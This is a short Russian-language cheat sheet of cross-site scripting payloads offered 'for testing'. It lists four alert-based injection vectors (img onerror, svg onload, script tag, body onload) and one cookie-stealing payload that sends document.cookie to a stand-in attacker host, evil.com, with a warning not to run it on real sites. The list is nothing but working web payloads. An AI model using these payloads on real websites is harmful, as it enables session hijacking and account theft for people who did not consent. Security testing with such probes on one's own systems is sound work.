📚 Примеры payload'ов для проверки

1. Классический алерт:

<img src=x onerror=alert('XSS')>

2. SVG-вектор:

<svg onload=alert(1)>

3. Тег script (сработает только через iframe или при вставке при загрузке):

<script>alert('XSS')</script>

4. body onload:

<body onload=alert(1)>

5. Кража cookie (демо, не выполнять на реальных сайтах!):

<img src=x onerror="document.location='http://evil.com/?c='+document.cookie">
